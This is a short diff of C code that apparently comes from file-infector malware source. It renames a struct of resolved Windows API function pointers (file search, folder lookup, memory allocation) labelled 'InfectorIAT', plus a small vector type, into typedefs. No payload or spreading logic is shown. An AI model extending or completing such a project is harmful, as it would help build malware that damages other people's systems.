@@ -70,7 +70,7 @@ typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
 typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
 typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
 
-struct InfectorIAT
+typedef struct __InfectorIAT
 {
    /* msvcrt */
    mallocHeader malloc;
@@ -92,14 +92,14 @@ struct InfectorIAT
 
    /* shell32 */
    SHGetFolderPathAHeader getFolderPath;
-};
+} InfectorIAT;
 
-struct CVector
+typedef struct __CVector
 {
    size_t type_size;
    size_t elements;
    void *data;
-};
+} CVector;
 
 #define RECAST(t,e) ((t)(e))
 #define CVECTOR_CAST(v,t) RECAST(t,(v)->data)
